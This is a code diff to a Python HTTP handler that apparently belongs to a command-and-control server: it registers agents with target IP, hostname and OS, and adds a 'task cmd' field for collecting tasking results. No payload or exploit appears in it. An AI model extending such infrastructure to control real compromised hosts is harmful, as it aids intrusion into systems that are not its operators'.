@@ -49,11 +49,11 @@ def register_agent(self):
         tgt_hostname = fields.get('hostname')
         tgt_os = fields.get('os type')
         tgt_os_version = fields.get('os version')
-        print(f"$$Agent UUID:          {uuid}")
-        print(f"$$Target IP Address:   {tgt_ip}")
-        print(f"$$Target Hostname:     {tgt_hostname}")
-        print(f"$$Target OS:           {tgt_os}")
-        print(f"$$Target OS Version:   {tgt_os_version}\n")
+        print(f"Agent UUID:          {uuid}")
+        print(f"Target IP Address:   {tgt_ip}")
+        print(f"Target Hostname:     {tgt_hostname}")
+        print(f"Target OS:           {tgt_os}")
+        print(f"Target OS Version:   {tgt_os_version}\n")
         new_agent = Agent(self.listener.name, str(uuid), tgt_ip, tgt_hostname[0], tgt_os[0], tgt_os_version[0])
         add_agent(new_agent)
 
@@ -91,6 +91,8 @@ def collect_results(self):
     output += '<form method="POST" enctype="multipart/form-data" action="/reg">'
     output += '<input name="task id" type="text" placeholder="Task ID">'
     output += '<input type="submit" value="Add">'
+    output += '<input name="task cmd" type="text" placeholder="Task cmd">'
+    output += '<input type="submit" value="Add">'
     output += '<input name="task results" type="text" placeholder="Task Results">'
     output += '<input type="submit" value="Add">'
     output += '</form>'
@@ -111,9 +113,11 @@ def collect_results(self):
         fields = cgi.parse_multipart(self.rfile, pdict)
         # Grab the "task" field that was input by the post request.
         task_id = fields.get('task id')
+        task_cmd = fields.get('task cmd')
         task_results = fields.get('task results')
-        print(f"$$Task ID:             {task_id}")
-        print(f"$$Task Results:        {task_results}")
+        print(f"Task ID:             {task_id}")
+        print(f"Task Cmd:             {task_cmd}")
+        print(f"Task Results:        {task_results}")
         # Come back to this later to add to dict ******************************************
         # tasklist.append(new_task[0])
 
